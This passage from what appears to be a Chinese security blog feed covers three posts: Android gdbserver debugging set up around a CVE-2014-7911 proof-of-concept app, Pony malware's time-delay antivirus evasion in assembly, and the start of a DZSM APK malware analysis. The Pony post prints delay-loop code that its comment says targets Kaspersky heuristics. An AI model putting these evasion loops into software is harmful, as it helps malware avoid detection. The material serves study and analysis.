class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">shell@mako:/ $ run-as<br>Usage: run-as   []<br><br>shell@mako:/ $ <br>shell@mako:/ $ run-as system_server /data/tmp/gdbserver --attach 596 :1234<br>run-as: Package &#x27;system_server&#x27; is unknown<br></code></pre></td></tr></table></figure><p>翻看源码，发现有下面 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* reject system packages */</span><br><span class="hljs-keyword">if</span> (userAppId &lt; AID_APP) &#123;<br>    panic(<span class="hljs-string">&quot;Package &#x27;%s&#x27; is not an application\n&quot;</span>, pkgname);<br>&#125;<br><span class="hljs-comment">/* reject any non-debuggable package */</span><br><span class="hljs-keyword">if</span> (!info.isDebuggable) &#123;<br>    panic(<span class="hljs-string">&quot;Package &#x27;%s&#x27; is not debuggable\n&quot;</span>, pkgname);<br>&#125;<br></code></pre></td></tr></table></figure><p>限制比较严格，调试系统app估计是没什么戏，root了应该就没有问题了。但是调试一般的app 还是没有问题的，用apktool 将 AndroidManifest.xml 的 debuggable 设置为true，重新 打包就可以进行native 的 debug 了。下面以CVE-2014-7911的POC为例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.heen.CVE_2014_7911&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">application</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:debuggable</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/AppTheme&quot;</span> &gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span> &gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><br>                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个app 正好 android:debuggable&#x3D;”true” 不用修改了，在模拟器上安装这个app。搭建 gdb调试环境, 分下面几个步骤走：</p><p>(1) 创建几个目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> ~/Android<br>mkidr ~/Android/system_lib<br>mkidr ~/Android/vendor_lib<br></code></pre></td></tr></table></figure><p>(2) 将Android 设置上的lib下载到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/Android/system_lib/<br>adb pull /system/lib<br><br><span class="hljs-built_in">cd</span> ~/Android/vendor_lib/<br>adb pull /vendor/lib<br><br><span class="hljs-built_in">cd</span> ~/Android<br><br><span class="hljs-comment"># 在64位系统 /system/bin/app_process32 和 /system/bin/app_process64</span><br>adb pull /system/bin/app_process<br><br><span class="hljs-built_in">cd</span> ~/Android<br>adb pull /system/bin/linker<br></code></pre></td></tr></table></figure><p>(3) 上传gdbserver</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">adb push <span class="hljs-variable">$NDK_PATH</span><span class="hljs-regexp">/prebuilt/</span>android-arm<span class="hljs-regexp">/gdbserver/g</span>dbserver <span class="hljs-regexp">/data/</span>local<span class="hljs-regexp">/tmp/g</span>dbserver<br></code></pre></td></tr></table></figure><p>环境基本搭建好了，测试一下 run-as 命令</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">adb shell ps</span><br><br><span class="hljs-meta prompt_">...</span><br>u0_a86    16907 174   900568 38564 ffffffff 00000000 S com.heen.CVE_2014_7911<br><span class="hljs-meta prompt_">...</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&gt; adb shell run-as com.heen.CVE_2014_7911 id<br><span class="hljs-attribute">uid</span>=10086(u0_a86) <span class="hljs-attribute">gid</span>=10086(u0_a86) <span class="hljs-attribute">groups</span>=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) <span class="hljs-attribute">context</span>=u:r:untrusted_app:s<br></code></pre></td></tr></table></figure><p>已经切换过来了，uid 变了，挂上gdbserver</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">&gt; adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">run</span>-<span class="hljs-keyword">as</span> com.heen.CVE_2014_7911 /data/<span class="hljs-keyword">local</span>/tmp/gdbserver :123 --attach 16907<br><br>Can&#x27;t <span class="hljs-keyword">open</span> socket: Permission denied.<br>Exiting<br></code></pre></td></tr></table></figure><p>报了另外一个错误，还是不行，google 一翻发现有debug-pipe 参数，尝试了一下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&gt; adb shell run-<span class="hljs-keyword">as</span> com.heen.CVE_2014_7911 /data/<span class="hljs-keyword">local</span>/tmp/gdbserver +<span class="hljs-keyword">debug</span>-pipe <span class="hljs-comment">--attach 16907</span><br>Attached; pid = <span class="hljs-number">16907</span><br>Listening <span class="hljs-keyword">on</span> Unix socket <span class="hljs-keyword">debug</span>-pipe<br></code></pre></td></tr></table></figure><p>恩，现在没有报错了,执行一下端口转发。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">adb</span> forward tcp:<span class="hljs-number">5039</span> localfilesystem:/<span class="hljs-class"><span class="hljs-keyword">data</span>/<span class="hljs-keyword">data</span>/com.heen.<span class="hljs-type">CVE_2014_7911</span>/debug-pipe</span><br><br></code></pre></td></tr></table></figure><p>OK, 已经可以调试了。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs gams">&gt; <span class="hljs-symbol">$</span>NDK_PATH/toolchains/arm-linux-androideabi<span class="hljs-number">-4.9</span>/prebuilt/linux-x86_64/bin/arm-linux-androideabi-gdb ~/Android/app_process <br>GNU gdb (GDB) <span class="hljs-number">7.6</span><br>Copyright (C) <span class="hljs-number">2013</span> <span class="hljs-keyword">Free</span> Software Foundation, Inc.<br>License GPLv3+: GNU GPL version <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> later <br>This is <span class="hljs-keyword">free</span> software: you are <span class="hljs-keyword">free</span> to change <span class="hljs-keyword">and</span> redistribute it.<br>There is <span class="hljs-keyword">NO</span> WARRANTY, to the extent permitted by law.  Type <span class="hljs-string">&quot;show copying&quot;</span><br><span class="hljs-keyword">and</span> <span class="hljs-string">&quot;show warranty&quot;</span> <span class="hljs-keyword">for</span> details.<br>This GDB was configured as <span class="hljs-string">&quot;--host=x86_64-linux-gnu --target=arm-linux-android&quot;</span>.<br><span class="hljs-keyword">For</span> bug reporting instructions, please see:<br>...<br>Reading symbols from /home/henices/Android/app_process...(<span class="hljs-keyword">no</span> debugging symbols found)...done.<br>(gdb) target remote :<span class="hljs-number">5039</span><br>Remote debugging <span class="hljs-keyword">using</span> :<span class="hljs-number">5039</span><br>warning: Could <span class="hljs-keyword">not</span> load shared library symbols <span class="hljs-keyword">for</span> <span class="hljs-number">100</span> libraries, e.g. /<span class="hljs-keyword">system</span>/bin/linker.<br>Use the <span class="hljs-string">&quot;info sharedlibrary&quot;</span> command to see the complete listing.<br>Do you need <span class="hljs-string">&quot;set solib-search-path&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;set sysroot&quot;</span>?<br>warning: Unable to find dynamic linker breakpoint function.<br>GDB will be unable to debug shared library initializers<br><span class="hljs-keyword">and</span> track explicitly loaded dynamic code.<br><span class="hljs-number">0x4013a73c</span> in ?? ()<br><br>(gdb) info proc<br>process <span class="hljs-number">16907</span><br>cmdline = <span class="hljs-string">&#x27;com.heen.CVE_2014_7911&#x27;</span><br>cwd = <span class="hljs-string">&#x27;/&#x27;</span><br>exe = <span class="hljs-string">&#x27;/system/bin/app_process&#x27;</span><br><br>(gdb) <span class="hljs-keyword">set</span> solib-search-path ~/Android:~/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">:</span>~/Android/<span class="hljs-comment">vendor_lib</span>/<br>(gdb) info sharedlibrary<br><span class="hljs-number">0x400f3a60</span>  <span class="hljs-number">0x400fe79c</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/linker<br><span class="hljs-number">0x40126070</span>  <span class="hljs-number">0x401566ec</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libc.so</span><br>0x40174828  <span class="hljs-comment">0x401749c8  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libstdc++.so<br><span class="hljs-number">0x401798f0</span>  <span class="hljs-number">0x4018c478</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libm.so</span><br>0x40114f50  <span class="hljs-comment">0x40116490  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/liblog.so<br><span class="hljs-number">0x4010c38c</span>  <span class="hljs-number">0x40110988</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libcutils.so</span><br>0x401acb1c  <span class="hljs-comment">0x401af20c  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libgccdemangle.so<br><span class="hljs-number">0x401a81d0</span>  <span class="hljs-number">0x401a94ac</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libcorkscrew.so</span><br>0x4019b780  <span class="hljs-comment">0x401a1f24  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libutils.so<br><span class="hljs-number">0x401cbc50</span>  <span class="hljs-number">0x401d5ba4</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libbinder.so</span><br>0x402955f0  <span class="hljs-comment">0x4029585c  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libhardware.so<br><span class="hljs-number">0x402925d0</span>  <span class="hljs-number">0x40292834</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libmemtrack.so</span><br>0x402bbbf0  <span class="hljs-comment">0x402cb80c  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libz.so<br><span class="hljs-number">0x402a4240</span>  <span class="hljs-number">0x402b23fc</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libandroidfw.so</span><br>0x402d6774  <span class="hljs-comment">0x402e53a0  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libexpat.so<br><span class="hljs-number">0x403083a8</span>  <span class="hljs-number">0x4031e684</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libstlport.so</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过延迟执行的方法来逃逸杀软</title>
    <link href="/cn/malware_time_delay_escape/"/>
    <url>/cn/malware_time_delay_escape/</url>
    
    <content type="html"><![CDATA[<h2 id="pony-2-0"><a href="#pony-2-0" class="headerlink" title="pony 2.0"></a>pony 2.0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs asm">; KAV heuristic fucker<br><br>KAVHeurKiller proc uses esi<br>    LOCAL   counter: DWORD<br>    AntiDisasmTrick<br>    push    eax<br>    mov ecx, ecx<br>    pop eax<br>    mov ecx, ecx<br>    push    eax<br>    sub esi, esi<br>    pop eax<br>    mov ecx, ecx<br>    push    19131011<br>    mov ecx, ecx<br>    pop counter<br>    mov edx, eax<br>    .WHILE  counter<br>        mov edx, eax<br>        mov ecx, ecx<br>        add eax, esi<br>        mov edx, eax<br>        mov ecx, ecx<br>        push    eax<br>        mov ecx, ecx<br>        mov edx, eax<br>        invoke  GetTickCount<br>        mov ecx, ecx<br>        pop eax<br>        mov edx, eax<br>        mov ecx, ecx<br>        add eax, edx<br>        mov ecx, ecx<br>        mov edx, eax<br>        dec counter<br>    .ENDW<br>    ret<br>KAVHeurKiller endp<br></code></pre></td></tr></table></figure><h2 id="pony-1-9"><a href="#pony-1-9" class="headerlink" title="pony 1.9"></a>pony 1.9</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">.WHILE  TRUE<br>    invoke  GetTickCount<br>    mov ecx, 10<br>    xor edx, edx<br>    div ecx<br>    .IF edx == 5<br>        .BREAK<br>    .ENDIF<br>.ENDW<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DZSM apk 样本分析</title>
    <link href="/cn/malware_DZSM/"/>
    <url>/cn/malware_DZSM/</url>
    
    <content type="html"><![CDATA[<h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><ul><li>MD5: 14792786094250715197540fd3b58439</li><li>SHA256: 456caeaaa8346c7a9e2198af5a0ca49d87e616a2603884580df22728a49893d7</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Certificate</span>:<br>    <span class="hljs-attribute">Data</span>:<br>        <span class="hljs-attribute">Version</span>: <span class="hljs-number">3</span> (<span class="hljs-number">0</span>x2)<br>        <span class="hljs-attribute">Serial</span> Number: <span class="hljs-number">1208868505</span> (<span class="hljs-number">0</span>x480dde99)<br>    <span class="hljs-attribute">Signature</span> Algorithm: sha256WithRSAEncryption<br>        <span class="hljs-attribute">Issuer</span>: C=CN, ST=sc, L=sc, O=maizi, OU=maizi, CN=pktool<br>        <span class="hljs-attribute">Validity</span><br>            <span class="hljs-attribute">Not</span> Before: Sep  <span class="hljs-number">9</span> <span class="hljs-number">09</span>:<span class="hljs-number">11</span>:<span class="hljs-number">13</span> <span class="hljs-number">2015</span> GMT<br>            <span class="hljs-attribute">Not</span> After : Jan <span class="hljs-number">25</span> <span class="hljs-number">09</span>:<span class="hljs-number">11</span>:<span class="hljs-number">13</span> <span class="hljs-number">2043</span> GMT<br>        <span class="hljs-attribute">Subject</span>: C=CN, ST=sc, L=sc, O=maizi, OU=maizi, CN=pktool<br>        <span class="hljs-attribute">Subject</span> Public Key Info:<br>            <span class="hljs-attribute">Public</span> Key Algorithm: rsaEncryption<br>                <span class="hljs-attribute">Public</span>-Key: (<span class="hljs-number">2048</span> bit)<br>                <span class="hljs-attribute">Modulus</span>:<br>                    <span class="hljs-attribute">00</span>:<span class="hljs-number">93</span>:<span class="hljs-number">57</span>:<span class="hljs-number">2</span>d:<span class="hljs-number">52</span>:af:c1:<span class="hljs-number">71</span>:cf:<span class="hljs-number">7</span>a:cb:<span class="hljs-number">2</span>f:<span class="hljs-number">6</span>a:<span class="hljs-number">6</span>c:<span class="hljs-number">0</span>a:<br>                    <span class="hljs-attribute">b2</span>:<span class="hljs-number">3</span>f:<span class="hljs-number">4</span>b:<span class="hljs-number">60</span>:a6:a7:d0:<span class="hljs-number">9</span>d:ba:<span class="hljs-number">36</span>:a1:<span class="hljs-number">0</span>f:<span class="hljs-number">0</span>d:cc:<span class="hljs-number">9</span>e:<br>                    <span class="hljs-attribute">32</span>:ea:<span class="hljs-number">23</span>:df:<span class="hljs-number">80</span>:a3:b3:<span class="hljs-number">9</span>f:<span class="hljs-number">2</span>b:<span class="hljs-number">93</span>:b9:<span class="hljs-number">53</span>:c4:e5:bf:<br>                    <span class="hljs-attribute">05</span>:<span class="hljs-number">32</span>:<span class="hljs-number">21</span>:<span class="hljs-number">23</span>:c1:<span class="hljs-number">13</span>:<span class="hljs-number">78</span>:b0:<span class="hljs-number">72</span>:<span class="hljs-number">08</span>:<span class="hljs-number">19</span>:<span class="hljs-number">8</span>e:<span class="hljs-number">5</span>e:c0:a0:<br>                    <span class="hljs-attribute">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">19</span>:d6:<span class="hljs-number">23</span>:<span class="hljs-number">8</span>a:b6:<span class="hljs-number">44</span>:<span class="hljs-number">2</span>b:<span class="hljs-number">73</span>:e0:<span class="hljs-number">1</span>d:f3:b3:f4:<br>                    <span class="hljs-attribute">ab</span>:<span class="hljs-number">6</span>c:<span class="hljs-number">2</span>e:af:<span class="hljs-number">78</span>:<span class="hljs-number">2</span>f:<span class="hljs-number">8</span>b:e2:dc:b0:d6:<span class="hljs-number">06</span>:af:<span class="hljs-number">8</span>e:<span class="hljs-number">3</span>f:<br>                    <span class="hljs-attribute">29</span>:<span class="hljs-number">54</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">59</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">73</span>:<span class="hljs-number">98</span>:<span class="hljs-number">2</span>f:fd:<span class="hljs-number">8</span>b:<span class="hljs-number">18</span>:b0:de:c6:<br>                    <span class="hljs-attribute">9c</span>:ee:<span class="hljs-number">0</span>c:c7:f7:<span class="hljs-number">04</span>:<span class="hljs-number">9</span>d:<span class="hljs-number">0</span>c:a7:<span class="hljs-number">62</span>:<span class="hljs-number">06</span>:<span class="hljs-number">45</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">08</span>:<span class="hljs-number">20</span>:<br>                    <span class="hljs-attribute">2e</span>:ca:a9:<span class="hljs-number">20</span>:<span class="hljs-number">88</span>:<span class="hljs-number">0</span>e:<span class="hljs-number">08</span>:<span class="hljs-number">2</span>b:f1:<span class="hljs-number">9</span>c:a9:<span class="hljs-number">24</span>:<span class="hljs-number">5</span>d:<span class="hljs-number">35</span>:<span class="hljs-number">85</span>:<br>                    <span class="hljs-attribute">02</span>:bb:c0:ff:<span class="hljs-number">37</span>:<span class="hljs-number">98</span>:<span class="hljs-number">4</span>b:c7:<span class="hljs-number">6</span>f:f2:<span class="hljs-number">75</span>:<span class="hljs-number">81</span>:<span class="hljs-number">43</span>:<span class="hljs-number">78</span>:f8:<br>                    <span class="hljs-attribute">4b</span>:cc:<span class="hljs-number">63</span>:<span class="hljs-number">8</span>c:f5:<span class="hljs-number">0</span>e:c9:<span class="hljs-number">95</span>:<span class="hljs-number">05</span>:<span class="hljs-number">3</span>d:ee:a1:<span class="hljs-number">85</span>:cd:<span class="hljs-number">94</span>:<br>                    <span class="hljs-attribute">97</span>:b8:<span class="hljs-number">48</span>:<span class="hljs-number">93</span>:<span class="hljs-number">02</span>:b3:<span class="hljs-number">71</span>:<span class="hljs-number">6</span>e:fb:<span class="hljs-number">39</span>:<span class="hljs-number">6</span>f:<span class="hljs-number">63</span>:<span class="hljs-number">5</span>d:a7:<span class="hljs-number">24</span>:<br>                    <span class="hljs-attribute">c1</span>:dc:<span class="hljs-number">77</span>:a9:<span class="hljs-number">9</span>c:de:<span class="hljs-number">5</span>d:<span class="hljs-number">76</span>:<span class="hljs-number">63</span>:a8:ad:<span class="hljs-number">1</span>d:e9:d6:<span class="hljs-number">84</span>:<br>                    <span class="hljs-attribute">9b</span>:ee:<span class="hljs-number">8</span>d:<span class="hljs-number">37</span>:<span class="hljs-number">38</span>:<span class="hljs-number">4</span>b:<span class="hljs-number">7</span>c:ff:<span class="hljs-number">94</span>:c9:df:dd:<span class="hljs-number">17</span>:<span class="hljs-number">80</span>:<span class="hljs-number">8</span>c:<br>                    <span class="hljs-attribute">e8</span>:d1:<span class="hljs-number">94</span>:<span class="hljs-number">5</span>d:<span class="hljs-number">05</span>:dc:ef:d8:dc:<span class="hljs-number">90</span>:<span class="hljs-number">4</span>c:<span class="hljs-number">8</span>b:<span class="hljs-number">75</span>:<span class="hljs-number">22</span>:<span class="hljs-number">6</span>d:<br>                    <span class="hljs-attribute">57</span>:<span class="hljs-number">6</span>e:ee:<span class="hljs-number">4</span>c:<span class="hljs-number">5</span>f:<span class="hljs-number">62</span>:<span class="hljs-number">96</span>:<span class="hljs-number">5</span>c:<span class="hljs-number">72</span>:<span class="hljs-number">64</span>:a4:<span class="hljs-number">5</span>b:<span class="hljs-number">0</span>f:<span class="hljs-number">29</span>:e0:<br>                    <span class="hljs-attribute">f3</span>:<span class="hljs-number">31</span>:<span class="hljs-number">11</span>:<span class="hljs-number">99</span>:<span class="hljs-number">6</span>a:b4:e5:<span class="hljs-number">6</span>c:<span class="hljs-number">16</span>:<span class="hljs-number">4</span>d:<span class="hljs-number">8</span>a:<span class="hljs-number">44</span>:<span class="hljs-number">46</span>:<span class="hljs-number">06</span>:<span class="hljs-number">8</span>f:<br>                    <span class="hljs-attribute">06</span>:<span class="hljs-number">05</span><br>                <span class="hljs-attribute">Exponent</span>: <span class="hljs-number">65537</span> (<span class="hljs-number">0</span>x10001)<br>        <span class="hljs-attribute">X509v3</span> extensions:<br>            <span class="hljs-attribute">X509v3</span> Subject Key Identifier: <br>                <span class="hljs-attribute">A6</span>:<span class="hljs-number">8</span>F:<span class="hljs-number">86</span>:BB:A7:<span class="hljs-number">0</span>A:DB:<span class="hljs-number">29</span>:<span class="hljs-number">2</span>E:E9:<span class="hljs-number">26</span>:A6:F1:<span class="hljs-number">8</span>C:BF:<span class="hljs-number">2</span>F:<span class="hljs-number">4</span>B:<span class="hljs-number">58</span>:<span class="hljs-number">99</span>:<span class="hljs-number">39</span><br>    <span class="hljs-attribute">Signature</span> Algorithm: sha256WithRSAEncryption<br>         <span class="hljs-attribute">82</span>:<span class="hljs-number">62</span>:<span class="hljs-number">98</span>:a8:<span class="hljs-number">39</span>:<span class="hljs-number">10</span>:<span class="hljs-number">3</span>b:f5:<span class="hljs-number">09</span>:<span class="hljs-number">42</span>:<span class="hljs-number">97</span>:de:e9:<span class="hljs-number">4</span>c:<span class="hljs-number">57</span>:<span class="hljs-number">6</span>c:<span class="hljs-number">4</span>e:<span class="hljs-number">58</span>:<br>         <span class="hljs-attribute">a3</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">31</span>:<span class="hljs-number">29</span>:a4:<span class="hljs-number">79</span>:<span class="hljs-number">98</span>:<span class="hljs-number">3</span>f:c9:<span class="hljs-number">68</span>:<span class="hljs-number">3</span>c:e5:<span class="hljs-number">90</span>:be:<span class="hljs-number">7</span>f:b0:<span class="hljs-number">98</span>:<span class="hljs-number">2</span>b:<br>         <span class="hljs-attribute">8f</span>:<span class="hljs-number">95</span>:<span class="hljs-number">9</span>e:<span class="hljs-number">4</span>e:d2:bc:<span 